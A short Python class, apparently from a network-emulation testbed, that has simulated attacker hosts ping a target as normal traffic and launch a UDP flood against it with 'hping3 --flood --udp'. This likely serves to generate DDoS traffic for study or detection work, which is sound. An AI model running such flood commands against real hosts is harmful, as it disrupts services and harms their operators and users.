import random

class Attacker:

    def __init__(self, target, attackers):
        self.target = target
        self.attackers = attackers
    
    # ping cmd to target
    def simple_normal_traffic(self):
        for attacker in self.attackers:
            ping_cmd = 'ping -i ' + str(random.uniform(0, 1)) + ' ' + self.target.IP() + ' &'
            print(ping_cmd)
            attacker.cmd(ping_cmd)

    def complex_normal_traffic(self):
        pass
    
    # flood udp packets to target
    def simple_ddos_traffic(self):
        # we may change to --faster if --flood is too much
        ddos_cmd = 'hping3 --flood --udp ' + self.target.IP() + ' &' 
        for attacker in self.attackers:
            attacker.cmd(ddos_cmd)